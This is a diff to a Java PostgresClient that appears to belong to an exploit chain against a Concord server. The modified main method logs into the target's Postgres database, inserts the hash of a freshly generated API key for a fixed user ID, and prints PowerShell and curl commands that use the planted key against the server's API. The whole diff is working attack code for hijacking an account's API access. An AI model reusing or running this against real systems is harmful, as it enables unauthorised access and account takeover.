@@ -5,6 +5,7 @@ import java.sql.Statement;
 import static java.util.Arrays.asList;
 import java.util.ArrayList;
 import java.util.List;
+//import exploit;
 public class PostgresClient {
   private String ip = null;
   private String port = null;
@@ -115,14 +116,19 @@ public class PostgresClient {
         if(args.length != 4) {
           throw new Exception("(-) Usage: java PostgresClient ip port usr pwd");
         }
-        else {
-          pgc = new PostgresClient(args[0], args[1], args[2], args[3]);
-          pgc.update( "api_keys", asList("api_key"), asList("user_id"), asList("d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8"), "api key value");
-        }
-        
+        pgc = new PostgresClient(args[0], args[1], args[2], args[3]);
+
+        String apiKey = Exploit.generateSecureRandom();
+        String apiKeyHash = Exploit.generateAPIKeyHash(apiKey);
+        pgc.log(String.format("(+) APIKey: %s", apiKey));
+        pgc.log(String.format("(+) API Key Sha256 Hash: %s", apiKeyHash));
+        pgc.log(String.format("(+) Powershell: iwr -Uri 'http://concord:8001/api/v1/apikey' -Headers @{ Authorization = \"%s\";ContentType= \"application/json\"}", apiKey));
+        pgc.log(String.format("(+) Bash: curl -H \"authorization: %s\" -H \"Content-Type: application/json\"  http://concord:8001/api/v1/apikey", apiKey));
+        pgc.update( "api_keys", asList("api_key"), asList("user_id"), asList("230c5c9c-d9a7-11e6-bcfd-bb681c07b26c"), apiKeyHash);
     } catch (Exception e) {
-        System.err.println(e.getClass().getName()+": "+e.getMessage());
+        pgc.log(e.getClass().getName()+": "+e.getMessage());
         System.exit(0);
     }
+
   }
 }
